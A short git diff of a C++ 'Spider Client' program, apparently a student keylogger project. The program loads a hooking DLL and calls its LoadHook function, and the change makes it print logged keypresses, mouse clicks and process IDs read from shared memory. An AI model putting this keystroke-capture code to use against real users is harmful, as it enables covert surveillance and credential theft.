@@ -6,7 +6,6 @@
 #define DLL_NAME_64 L"C:\\Users\\lecler_i\\Documents\\Visual Studio 2013\\Projects\\Spider Client\\x64\\Debug\\ClientDll.dll"
 #define DLL_NAME_86 L"F:\\Work\\spider-2017-sana_c\\SpiderClient\\x64\\Debug\\ClientDll.dll"
 
-
 #include <windows.h>
 #include <string>
 #include <iostream>
@@ -14,6 +13,7 @@
 
 #include "Injector.h"
 #include "SharedMemoryServer.h"
+#include "data.h"
 
 int entry_main(int argc, _TCHAR* argv[])
 {
@@ -28,12 +28,8 @@ int entry_main(int argc, _TCHAR* argv[])
 		getchar();
 		return -1;
 	}
-
 	typedef void(*fnPtr)(void);
 
-	/*
-	* Get the address of the function inside the DLL.
-	*/
 	fnPtr addr = (fnPtr)GetProcAddress(dll, "LoadHook");
 	if (addr == NULL) {
 		printf("The function was not found.n");
@@ -41,13 +37,18 @@ int entry_main(int argc, _TCHAR* argv[])
 		return -1;
 	}
 	addr();
-
 	while (1)
 	{
 		Data test = shm.pop();
-		std::cout << test.t << std::endl; 
-		
-		Sleep(1000);
+		if (test.t != NONE)
+		{
+			std::cout << "[" << test.pid << "] ";
+			if (test.t == MOUSELOG)
+				std::cout << "Click at " << test.data.mouse.x << ";" << test.data.mouse.y << std::endl;
+			else
+				std::cout << "Keypress " << test.data.key.keyCode << std::endl;
+		}
+		Sleep(100);
 	}
 	return (0);
 }
